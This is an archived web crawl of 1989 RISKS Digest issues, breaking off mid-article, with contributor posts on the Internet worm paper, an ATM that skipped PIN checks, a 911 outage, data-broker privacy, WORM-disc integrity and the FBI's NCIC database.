PO Box 218, Lindfield, NSW 2070.  (ph) +61 2 467 6721 (fax) +61 2 416 9317

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
MIT virus paper available for anonymous ftp
</A>
</H3>
<address>
Jon Rochlis 
&lt;<A HREF="mailto:jon@ATHENA.MIT.EDU">
jon@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Tue, 14 Feb 89 18:11:49 EST
</i><PRE>

The MIT paper on the Internet virus of last Novemember, "With Microscope and
Tweezers: An Analysis of the Internet Virus of November 1988", is now
available via anonymous ftp from either bitsy.mit.edu (18.72.0.3) or
athena-dist.mit.edu (18.71.0.38) in the pub/virus directory as mit.PS (and
mit.PS.Z). A version of this paper will be presented at the 1989 IEEE
Symposium on Research in Security and Privacy.
                                                  		-- Jon

Abstract:

In early November 1988 the Internet, a collection of networks consisting of
60,000 host computers implementing the TCP/IP protocol suite, was attacked
by a virus, a program which broke into computers on the network and which
spread from one machine to another.  This paper is a detailed analysis of
the virus program itself, as well as the reactions of the besieged Internet
community.  We discuss the structure of the actual program, as well as the
strategies the virus used to reproduce itself. We present the chronology of
events as seen by our team at MIT, one of a handful of groups around the
country working to take apart the virus, in an attempt to discover its
secrets and to learn the network's vulnerabilities.

We describe the lessons that this incident has taught the Internet community
and topics for future consideration and resolution.  A detailed routine by
routine description of the virus program including the contents of its built
in dictionary is provided.  

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Prospectus for "Computer Viruses"
</A>
</H3>
<address>
&lt;<A HREF="mailto:"CORDANI, LTC J/A914-2469474" <cordani@pentagon-opti.army.mil> ">
"CORDANI, LTC J/A914-2469474" &lt;cordani@pentagon-opti.army.mil&gt; 
</A>&gt;
</address>
<i>
12 Feb 89 17:08:00 EDT
</i><PRE>

  1. Dr. J Cordani, at Adelphi University, and E. Rustadt, at Pace University
propose to bring out a collection of articles on the subject of computer
viruses for the academic and research community.
  2. We envision a volume of 10 to 20 articles, each 10 to 30 pages in length.
We will attempt to cover the field of viruses in historical, social, ethical,
economic, and technical areas.
  3. We envision a section as introduction, theory, classifications, life
cycles, epidemiology, countermeasures, economic and social issues, law,
beneficial uses, the future.  
  4. As a member of this forum, I know of few more fruitful media in which to
search for participants. 
  5. I should be most happy to discuss participation in the project with those
interested.  

Dr. John Cordani Schools of Business Adelphi University Garden City, NY 11530
(516) 663 1182 

(My host system will be down from Feb 17 to Feb 24 from maint problems.)

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.24.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.26.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-76</DOCNO>
<DOCOLDNO>IA012-000131-B038-48</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.26.html 128.240.150.127 19970217025607 text/html 22977
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:54:29 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 26</TITLE>
<LINK REL="Prev" HREF="/Risks/8.25.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.27.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.25.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.27.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 26</H1>
<H2> Wednesday 15 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  "$15 Million Computer Dud Baffles Udall" 
</A>
<DD>
<A HREF="#subj1.1">
Joseph M. Beckman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Computer blamed for 911 system crash 
</A>
<DD>
<A HREF="#subj2.1">
Rodney Hoffman
</A><br>
<A HREF="#subj2.2">
 Paul Blumstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Selling who-called-the-800-number data 
</A>
<DD>
<A HREF="#subj3.1">
Bob Ayers
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  PIN?  Who needs a PIN? 
</A>
<DD>
<A HREF="#subj4.1">
Alan Wexelblat
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Door Sensors and Kids 
</A>
<DD>
<A HREF="#subj5.1">
Eddie Caplan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Risks of misunderstanding probability and statistics 
</A>
<DD>
<A HREF="#subj6.1">
Tom Blinn
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Why you can't "flip" bits on a WORM disc 
</A>
<DD>
<A HREF="#subj7.1">
Daniel Ford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Credit Checker &amp; Nationwide SS# Locate 
</A>
<DD>
<A HREF="#subj8.1">
David Andrew Segal
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: Authenticity in digital media 
</A>
<DD>
<A HREF="#subj9.1">
Pete Schilling
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: multi-gigabuck information "theft" 
</A>
<DD>
<A HREF="#subj10.1">
Jeff Makey
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
"$15 Million Computer Dud Baffles Udall"
</A>
</H3>
<address>
"Joseph M. Beckman" 
&lt;<A HREF="mailto:Beckman@DOCKMASTER.ARPA">
Beckman@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 15 Feb 89 16:45 EST
</i><PRE>

Summarized from the Washington Times (2-15-89):  The US Office of Surface
Mining has spent some $15 million on a computer system to prevent strip mine
law violators from obtaining new permits.  The GAO is calling it a failure.
The system apparently has a high error rate because it uses lists of names and
addresses that are not complete.  Arizonia democrat "Mo" Udall was quoted as
saying "I'm really baffled.  We have computer systems in this country to keep
track of everything from missiles to kindergarten kids who are sick or absent.
But the Interior Department can't develop a system, even with the help of %15
million, to keep violators out of the coalfields."

By using the phrase "missiles to kindergarten kids" he seems to imply that
systems are handling things as complex as missiles to as simple as...  Of
course, the fact that the subjects of the systems may be very complicated says
nothing about what the system is actually doing.
                                                        Joseph
</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Computer blamed for 911 system crash -- more (<A HREF="/Risks/8.24.html">RISKS-8.24</A>)
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
15 Feb 89 09:38:31 PST (Wednesday)
</i><PRE>

On Saturday, 11 Feb 89, the Los Angeles city emergency 911 telephone system
crashed twice.  The initial story, summarized in RISKS 8.24, blamed "a
power failure in the computer's signalling mechanism."  The `Los Angeles
Times' (14 Feb 89) carried a follow-up story by Frederick M. Muir and Paul
Feldman, with the following new information.

The crash was caused by one power converter board, an SL/1 positron switch,
that helps control power fed to a complex switching system.  It failed for
still unknown reasons.  It's an off-the-shelf part that involves a low
degree of technology and sells for $1000, according to Pacific Bell service
manager Mike Fink.  The switch recieves incoming 911 calls and routes them
virtually instantaneously to the first open phone line.

"Fink said the board that failed is usually so reliable and simple that no
backup was designed into the system.  It is virtually the only part of the
system -- which cost $1.6 million to install -- without a backup."

Asked for past failure statistics, Pacific Bell and General Telephone,
which between them operate hundreds of 911 systems across California,
reported only two other failures in the past two years, neither of which
was linked to the part which failed Saturday.


</PRE>
<HR><H3><A NAME="subj2.2">
Computer blamed for 911 system crash -- more (Re: <A HREF="/Risks/8.24.html">RISKS-8.24</A>)
</A>
</H3>
<address>
paulb@ttidca.tti.com
&lt;<A HREF="mailto:Paul Blumstein ">
Paul Blumstein 
</A>&gt;
</address>
<i>
Wed, 15 Feb 89 09:29:23 PST
</i><PRE>

... The Los Angeles 911 system has had continual overload problems since its
inception because it was expected that only 30-40% of emergency callers
would use the system.  The actual number turned out to be 75%.  In
addition, the system has received a large amount of non-emergency calls.

The overload has caused a several-minute delay during peak periods before a
911 operator could be reached.

Paul Blumstein, Citicorp/TTI, Santa Monica, CA 
{philabs,csun,psivax}!ttidca!paulb  or  paulb@ttidca.TTI.COM

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Selling who-called-the-800-number data
</A>
</H3>
<address>
Bob Ayers
&lt;<A HREF="mailto:ayers@src.dec.com ">
ayers@src.dec.com 
</A>&gt;
</address>
<i>
Mon, 13 Feb 89 12:59:53 PST
</i><PRE>

Those that liked the idea of states selling driver info will really love
this one.  As reported in the 20 February Forbes magazine, a new company,
Strategic Information Inc ...

    will collect, analyze and resell information on everything from retail
    prices in grocery stores to the premiums charged by insurance
    companies ... [it] intends to offer custom tailoring of such data to
    meet the needs of individual clients ...

    One feature, available this spring through a 160-million-name database
    that Strategic recently purchased, will be marketed to companies with
    toll-free phone lines: For a fee, the companies can check the origins
    of any calls they receive through 800 numbers -- even those that don't
    go through -- enabling them to target the dialers for follow-up
    mailings or sales pitches.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
PIN?  Who needs a PIN?
</A>
</H3>
<address>
Alan Wexelblat
&lt;<A HREF="mailto:wex@radiant.csc.ti.com ">
wex@radiant.csc.ti.com 
</A>&gt;
</address>
<i>
Wed, 15 Feb 89 10:39:44 CST
</i><PRE>

Last night I had a rather frightening experience with my bankcard.  Using
one of the network of machines which is supposed to accept my card, I tried
to make a withdrawal.  The machine accepted my card, printed a message on
its screen saying "Hello Alan Wexelblat, welcome to &lt;competing bank
machine&gt;" and gave me the standard menu of options (withdraw, deposit,
transfer, balance).  At no time did it ask for my PIN.

I didn't notice this until I had already tried to make a withdrawal.  The
transaction was denied because my bank's computer was down, but the
implication is really fairly scary: anyone with my card can walk up to this
machine and get $400 of my money without either him or me doing anything to
compromise the "highly private" PIN.

I'm not sure if this is the normal mode of operation for this bank's
machines, or was a peculiar isolated failure or was due to a system-wide
fault in the operating software.  Anyone else had a similar experience?

(The machine maker is Diebold; does anyone know if all machines by a given
manufacturer run the same software?  I've used other Diebold machines before
and never had anything like this happen.)

--Alan Wexelblat	 TI Application Tools, Austin, TX

             [If you bank in a Diebold Cave, you say "NO PIN, OH SESAME!"  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Door Sensors and Kids
</A>
</H3>
<address>
&lt;<A HREF="mailto:eddie.caplan@H.GP.CS.CMU.EDU">
eddie.caplan@H.GP.CS.CMU.EDU
</A>&gt;
</address>
<i>
Wed, 15 Feb 89 16:42:36 EST
</i><PRE>

While reading back issues of RISKS, I ran across the discussion here about
automatic sensors for controlling doors.  This made me recall that when we
would bring our 2 year old son into work, he was not tall enough to trip the
electronic eyes on the elevator doors.  Subsequently, we always had to be sure
to hold the door until he passed through or he would get bonked.  The doors
never closed hard enough to cause him any serious damage, but that's the RISK
of the doors' hardware working properly.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Risks of misunderstanding probability and statistics
</A>
</H3>
<address>
Dr. Tom @MKO, CMG S/W Mktg, DTN 264-4865
&lt;<A HREF="mailto:blinn%dr.DEC@decwrl.dec.com ">
blinn%dr.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
15 Feb 89 08:37
</i><PRE>

As a person who has earned a doctorate in statistics, with emphasis on its
practical applications (although I no longer work in that field), I have been
both amused and appalled by some of the recent contributions focusing on
probabilistic and statistical analysis of the risks of aircraft engine failures.

Some of the contributions assume, for example, that there really is such a
thing as "the probability that one engine will fail", and that therefore you
can compute the probability that two engines will fail (assuming that the
failures are independent) by simply squaring this "p".  This is such an
incredibly simplistic way of looking at the problem that I'm amazed that anyone
would offer it for consideration.  Clearly, on any given aircraft, the engines
share some subsystems in common; for example, they draw fuel from a common
supply, possibly with a common fuel pump, possibly using two or more
independent pumps.  Certain failures in the common subsystems could cause both
(or all) engines to fail.  On the other hand, the engines have other subsystems
that are not shared.  While these unique subsystems may have been equivalent
(and thus, have a common propensity to fail) at the time of manufacture, they
almost certainly are not equivalent after any period of maintenance in the
field.  Consequently, even if we disregard the failures of common subsystems,
the remaining engines almost certainly don't share a common probability of
failure.  Assuming they do can be an interesting and useful strategem for
thinking about joint probability of failure, but it's a dangerous
oversimplification.

In RISKS-FORUM Digest Volume 8 : Issue 24, it is asserted by Barry Redmond that

&gt;If someone makes a mistake on one engine at any of these times, there is a
&gt;high probability that they will make the same mistake on the other engine(s).

That may be true, but it may not be true, because the same person may not
be working on all the engines.  I would agree that an incompetent mechanic
working on all the engines is likely to make the same mistakes on all of
them, but the reality of aircraft engine repair is different.

&gt;The probabilities of failure are not independent because if one engine fails it
&gt;immediately increases the probability of another failing.

This is a very interesting assertion.  It seems to be saying that there is a
causal relationship between a first engine failure and the likelihood of a
second.  Now, I would agree that if I were on an aircraft where one engine had
just failed, I'd worry lots more that a second would fail as well then I
usually would worry about engine failure when no engines had failed, but this
doesn't mean that the probability of failure of the other engines has changed
in any way.  (It also doesn't mean that it hasn't, and if it has changed, it
could be less or greater.)

It's unfortunate that a thorough grounding in probability theory and in
statistical inference (and in risk analysis) isn't a part of the technical
curriculum.  Failures happen.  They usually are not independent.  Knowing how
to analyse the risks of failures can help in making the tough decisions about
where to put resources to "prevent" or "protect against" failures.
                                                                       Tom
 
Dr. Thomas P. Blinn, Marketing Consultant, Application Platforms, 
U. S. Channels Sales, Digital Equipment Corporation, 
Continental Blvd. -- MKO2-2/F10 Merrimack, New Hampshire 03054
 
  Opinions expressed herein are my own, and do not necessarily represent
  those of my employer or anyone else, living or dead, real or imagined.
 
</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Why you can't "flip" bits on a WORM disc
</A>
</H3>
<address>
Daniel Ford 
&lt;<A HREF="mailto:daford@watdragon.waterloo.edu">
daford@watdragon.waterloo.edu
</A>&gt;
</address>
<i>
Wed, 15 Feb 89 11:23:41 EST
</i><PRE>

Some contributors have noted that there are risks in trusting the integrity of
data stored on indelible storage devices such as WORM type optical discs.
These types of devices are often employed to store archival data that is never
legitimately altered (bank records, school transcripts, transaction logs,
etc.).  There seem to be two risks to trusting this technology.  The first is
"How can you be sure that the disc you are reading is the original and not some
altered copy?" and the second was "How can you be sure that some bits have not
been 'flipped' by overwriting a disc sector with a new value that happens to
burn a pit in the right spot?" The first concern is valid, but the second is
not.

There are two reasons for this.  Firstly, each disc sector on a WORM (and
other types of optical discs) disc is protected with a sophisticated error
correction code.  These codes are very robust and are used because the very
high storage densities of optical discs tend to give them correspondingly
high error rates.  So, if a bit (or several) was somehow "flipped", the ECC
would either "correct" the change or report a read error. 

The second reason has to do with how data is actually encoded on the disc
surface.  Contrary to what might first be thought, "pits" (the holes) and
"lands" (space in a track between pits) do not correspond directly to 1's and
0's.  Rather, their lengths and transitions form a sequence that encodes the
data.  Many codes have been developed, but a common one is NRZM (Non-return to
zero mark).  Basically, in this code the transitions between the lengths of
both pits and lands record sequences of 0's and the transitions between the two
record individual 1's.  Certain minimum and maximum lengths of pits and lands
must be respected for clocking and detection purposes.

In such a scheme, you cannot just flip one bit (by making a pit longer) you
must flip two or more.  So, even if you could get past the ECC, it would be
quite difficult to get something specific and meaningful (i.e. not some weird
control character in the middle of someone's name) by overwriting a WORM disc
sector.

Further, each sector overwrite will also overwrite the ECC and change its
encoded value, which is burned into the disc along with the data, to some
other value.  As such, it is unlikely that the ECC and the sector contents
will remain consistent after an overwrite (giving subsequent read errors).

It would be much easier to forge a disc and substitute it for the real thing
then try to alter the original.  But, safeguards against that can be developed
as well.
                                        Dan Ford

     [Thanks for the elaboration.  But remember that even if you have an
     N-error detecting code, many (N+1)-bit falsifications will go 
     undetected.  Similar problems exist with ECC.  PGN]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Credit Checker &amp; Nationwide SS# Locate
</A>
</H3>
<address>
David Andrew Segal
&lt;<A HREF="mailto:dasegal@brokaw.LCS.MIT.EDU ">
dasegal@brokaw.LCS.MIT.EDU 
</A>&gt;
</address>
<i>
Wed, 15 Feb 89 16:52:28 EST
</i><PRE>

A member of my research group received the following "comforting"
advertisement in the mail (comments in [] are my editorial remarks...):

		CREDIT CHECKER &amp; NATIONWIDE SS#-LOCATE
			       just got
			       BETTER!

PROFESSIONAL CREDIT CHECKER has always offered: 
* Consumer Credit Reports from thousands of credit sources coast-to-coast.
* Social Security Number tracing anywhere in the country.
* Driver's License reports from every state but Massachusetts [See Risks 8.20]
* Financial reports on over 9,000,000 businesses all across the USA.

			       and now,
		     PROFESSIONAL CREDIT CHECKER
		   offers an exciting NEW service: [oh, boy]

		 NATIONAL ADDRESS/IDENTIFIER UPDATE!
		 -----------------------------------

With NATIONAL ADDRESS/IDENTIFIER UPDATE you can enter either a name
and address or a Social Security Number.  The Network will search all
over the nation and get a complete report back to you in just seconds!

You can get such information as all current names, aliases, social
security numbers and/or variances, date of birth, present and past
employers and past and/or present addresses.

You can find people anywhere in the country without having to access a full
Credit Report.  No permissible purpose under the Federal Law is required to run
NATIONAL ADDRESS?IDENTIFIER UPDATE...and NO RECORD of an inquiry will be logged
on the consumer's credit report! ... [Boy, it isn't illegal and no one will
ever no you invaded their privacy!]

-----END OF ADVERTISEMENT------

I think the ad says it all.
David Andrew Segal, MIT Laboratory for Computer Science

                             [And don't forget the on-line National Credit
                             Information Network mentioned in <A HREF="/Risks/8.11.html">RISKS-8.11</A>.  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: Authenticity in digital media (<A HREF="/Risks/8.25.html">RISKS-8.25</A>)
</A>
</H3>
<address>
"ALBTSB::SCHILLING1" 
&lt;<A HREF="mailto:schilling1%albtsb.decnet@aldncf.alcoa.com">
schilling1%albtsb.decnet@aldncf.alcoa.com
</A>&gt;
</address>
<i>
15 Feb 89 14:51:00 EST
</i><PRE>

Seeing hasn't been believing for a long time.  Remember Fred Astaire dancing on
the ceiling in the movie "Singing in the Rain"?  And the newsreel footage
showing Hitler dancing a little jig in front of the Eiffel Tower after the
French surrender in WWII was a good piece of 1940 film editing, not an accurate
motion picture.  Counterfeit paintings in the style of well-known artists have
been around for at least four hundred years.  The Shroud of Turin was recently
found to date from the 13th instead of the 1st century A.D.  Counterfeit coins
were a problem in Roman Empire.

Computers haven't cut us off from history.  They just provide new tools with
which human beings can fool one another.
                                             Pete Schilling, Alcoa Laboratories

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: multi-gigabuck information "theft"
</A>
</H3>
<address>
Jeff Makey 
&lt;<A HREF="mailto:Makey@LOGICON.ARPA">
Makey@LOGICON.ARPA
</A>&gt;
</address>
<i>
14 Feb 1989 2127-PST (Tuesday)
</i><PRE>

In RISKS DIGEST 8.23 Mark Brader &lt;msb@sq.sq.com&gt; paraphrases a recent
article from the Toronto Star:

&gt;A password belonging to [a large Canadian] company was used to steal
&gt;information which the company values at $4 billion (Canadian) ...

This report isn't news.  The "computer files" are nothing more than the source
code for AT&amp;T's UNIX operating system, copies of which may be easily obtained
for a license fee on the order of a few thousand dollars -- a far cry from $4
billion.  I suspect that AT&amp;T's lawyers are at the root of this sensationalism.

Jeff Makey    

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.25.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.27.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-77</DOCNO>
<DOCOLDNO>IA012-000131-B038-69</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.27.html 128.240.150.127 19970217025622 text/html 23253
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:54:49 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 27</TITLE>
<LINK REL="Prev" HREF="/Risks/8.26.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.28.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.26.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.28.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 27</H1>
<H2> Thursday 16 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  FBI NCIC Data Bank 
</A>
<DD>
<A HREF="#subj1.1">
Bob Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Internet mail forgery 
</A>
<DD>
<A HREF="#subj2.1">
Walter Roberson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Dead code maintenance 
</A>
<DD>
<A HREF="#subj3.1">
Clifford Johnson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Probabilities and Engines 
</A>
<DD>
<A HREF="#subj4.1">
Steve Philipson
</A><br>
<A HREF="#subj4.2">
 Robert Dorsett
</A><br>
<A HREF="#subj4.3">
 Daniel A. Graifer
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 FBI NCIC Data Bank
</A>
</H3>
<address>
&lt;<A HREF="mailto:RMorris@DOCKMASTER.ARPA">
RMorris@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 16 Feb 89 09:41 EST
</i><PRE>

  Proposed FBI Crime Computer System Raises Questions on Accuracy, Privacy --
     Report Warns of Potential Risk Data Bank Poses to Civil Liberties
                 Washington Post, February 13, 1989
                         by Evelyn Richards

   On a Saturday afternoon just before Christmas last year, U.S. Customs
officials at Los Angeles International Airport scored a "hit."
   Running the typical computer checks of passengers debarking a Trans World
Airlines flight from London, they discovered Richard Lawrence Sklar, a fugitive
wanted for his part in an Arizona real estate scam.
   As their guidelines require, Customs confirmed all the particulars about
Sklar with officials in Arizona - his birth date, height, weight, eye and hair
color matched those of the wanted man.
   Sklar's capture exemplified perfectly the power of computerized crime
fighting.  Authorities thousands of miles away from a crime scene can almost
instantly identify and nab a wanted person.
   There was only one problem with the Sklar case:  He was the wrong man.  The
58-year old passenger - who spent the next two days being strip-searched,
herded from one holding pen to another and handcuffed to gang members and other
violent offenders - was a political science professor at the University of
California at Los Angeles.
   After being fingered three times in the past dozen years for the financial
trickeries of an impostor, Sklar is demanding that the FBI, whose computer
scored the latest hit, set its electronic records straight.  "Until this person
is caught, I am likely to be victimized by another warrant," Sklar said.
   Nowhere are the benefits and drawbacks of computerization more apparent than
at the FBI, which is concluding a six-year study on how to improve its National
Crime Information Center, a vast computer network that already links 64,000 law
enforcement agencies with data banks of 19 million crime-related records.
   Although top FBI officials have not signed off on the proposal, the current
version would let authorities transmit more detailed information and draw on a
vastly expanded array of criminal records.  It would enable, for example,
storage and electronic transmission of fingerprints, photos, tattoos and other
physical attributes that might prevent a mistaken arrest.  Though
controversial, FBI officials have recommended that it include a data bank
containing names of suspects who have not been charged with a crime.
   The proposed system, however, already has enraged computer scientists and
privacy experts who warn in a report to be released today that the system would
pose a "potentially serious risk to privacy and civil liberties." The report,
prepared for the House subcommittee on civil and constitutional rights, also
contends that the proposed $40 million overhaul would not correct accuracy
problems or assure that records are secure.
   Mostly because of such criticism, the FBI's revamped proposal for a new
system, known as the NCIC 2000 plan, is a skeleton of the capabilities first
suggested by law enforcement officials.  Many of their ideas have been pared
back, either for reasons of practicality or privacy.
   "Technical possibility should not be the same thing as permissible policy,"
said Marc Rotenberg, an editor of the report and Washington liaison for
Computer Professionals for Social Responsibility, a California organization.
The need to make that tradeoff - to weigh the benefits of technological
advances against the less obvious drawbacks - is becoming more apparent as
nationwide computer links become the blood vessels of a high-tech society.
   Keeping technology under control requires users to double-check the accuracy
of the stored data and sometimes resort told-fashioned paper records or
face-to-face contact for confirmation.  Errors have plagued the NCIC for many
years, but an extensive effort to improve record-keeping has significantly
reduced the problem, the FBI said.
   Tapped by federal, state and local agencies, the existing FBI system juggles
about 10 inquiries a second from people seeking records on wanted persons,
stolen vehicles and property, and criminal histories, among other things.
Using the current system, for example, a police officer making a traffic stop
can fine out within seconds whether the individual is wanted anywhere else in
the United States, or an investigator culling through a list of suspects can
peruse past records.
   At one point, the FBI computer of the future was envisioned as having links
to a raft of other data bases, including credit records and those kept by the
Immigration and Naturalization Service, the Internal Revenue Service, the
